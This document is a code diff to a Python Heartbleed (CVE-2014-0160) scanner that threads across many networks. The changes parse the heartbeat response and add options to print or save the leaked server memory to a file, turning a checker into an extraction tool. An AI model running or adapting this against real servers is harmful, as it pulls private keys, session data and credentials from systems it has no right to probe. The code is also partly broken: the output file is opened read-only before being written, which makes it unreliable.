@@ -2,7 +2,7 @@
 #     File Name           :     heartBleed.py
 #     Created By          :     Jone Casper(xu.chenhui@live.com)
 #     Creation Date       :     [2014-04-14 12:57]
-#     Last Modified       :     [2014-04-14 12:58]
+#     Last Modified       :     [2014-04-14 21:57]
 #     Description         :     Test for SSL heartbleed vulnerability
 #################################################################################
 #!/usr/bin/env python
@@ -99,7 +99,6 @@ class heartBleed:
                         res = sock.recv(1024)
                         if res is None or len(res) < 1024:
                             _end = True
-                            break;
                         _data += res
                 elif fileno == sockfno and event and select.EPOLLHUP:
                     epoll.unregister(fileno)
@@ -119,6 +118,13 @@ class heartBleed:
 
         pay = self._recvall(sock, l=ln, timeout=timeout)
         return type, ver, ln, pay
+
+    def unpackHeartBeat(self, pay):
+        if len(pay) >= 3:
+            header = pay[:3]
+            h, l = struct.unpack('>BH', header)
+            return h, l, pay[3:]
+        return None, None, None
         
     def _getSSLHeader(self, msg):
         if len(msg) >= 5:
@@ -148,9 +154,11 @@ class heartBleed:
         elif type == 21:
             return False
         elif type == 24:
-            self._error = " ".join("{:02x}".format(ord(c)) for c in pay)
-            if len(pay) > 3:
-                is_vulnerable = True
+            #self._error = " ".join("{:02x}".format(ord(c)) for c in pay)
+            self._error = pay
+            return True
+            #if len(pay) > 3:
+            #    is_vulnerable = True
         else:
             self._error = "Failed: Can not receive the response."
 
@@ -187,7 +195,10 @@ class heartBleed:
 
 if __name__ == "__main__":
     from optparse import OptionParser
+    import os.path
     options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160)')
+    options.add_option('-o', dest="outpay", action="store_true", help="Output the data when the server is vulnerable.")
+    options.add_option('-f', dest="outtofile", help="Output the data to a file when the server is vulnerable.")
     options.add_option('--threads', dest="threads", default=100, help="Thread number, defaut is 5.")
     opts, args = options.parse_args()
 
@@ -203,6 +214,17 @@ if __name__ == "__main__":
         res = test._run()
         if res:
             print "The domain " + test.domain + " is vulnerable!"
+            if opts.outpay:
+                h, l, p = test.unpackHeartBeat(test._error)
+                print " ".join("{:02x}".format(ord(c)) for c in p)
+            if opts.outtofile is not None and \
+               len(opts.outtofile)>0:
+                if os.path.exists(os.path.dirname(opts.outtofile)):
+                    with open(opts.outtofile) as fd:
+                        fd.write(test._error)
+                else:
+                    print "Output file error!"
+
         elif test._error is not None:
             print "Scan domain[" +  test.domain + "] error: " + test._error
         else:
